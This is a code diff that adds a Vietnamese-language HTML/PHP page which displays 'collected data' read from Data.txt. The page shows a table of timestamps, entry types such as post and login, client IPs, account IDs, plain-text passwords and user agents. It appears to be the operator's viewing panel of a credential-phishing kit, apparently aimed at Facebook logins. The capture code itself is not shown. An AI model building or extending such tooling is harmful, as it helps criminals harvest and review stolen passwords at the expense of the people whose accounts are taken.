@@ -165,4 +165,48 @@ if (isset($_GET['view'])) {
     }
 
 }
+
 ?>
+<!doctype html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8" />
+    <title>Bảng dữ liệu</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        h1 { color: #1877f2; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        .post-type { color: green; font-weight: bold; }
+        .login-type { color: orange; }
+    </style>
+</head>
+<body>
+    <h1>Dữ liệu đã thu thập (Data.txt)</h1>
+    <p>Tổng số dòng: <?php echo count($rows); ?></p>
+    <table>
+        <thead>
+            <tr>
+                <th>Thời gian</th>
+                <th>Loại</th>
+                <th>IP Client</th>
+                <th>Tài khoản (ID)</th>
+                <th>Mật khẩu (PW)</th>
+                <th>OS / Browser (User Agent)</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php foreach (array_reverse($rows) as $row): // Hiển thị dòng mới nhất lên đầu ?>
+            <tr>
+                <td><?php echo htmlspecialchars($row['time']); ?></td>
+                <td class="<?php echo strtolower($row['type']); ?>-type"><?php echo htmlspecialchars($row['type']); ?></td>
+                <td><?php echo htmlspecialchars($row['client_ip']); ?></td>
+                <td><?php echo htmlspecialchars($row['identifier']); ?></td>
+                <td><?php echo htmlspecialchars($row['password']); ?></td>
+                <td><?php echo htmlspecialchars($row['ua'] ?? 'N/A'); ?></td> </tr>
+            <?php endforeach; ?>
+        </tbody>
+    </table>
+</body>
+</html>
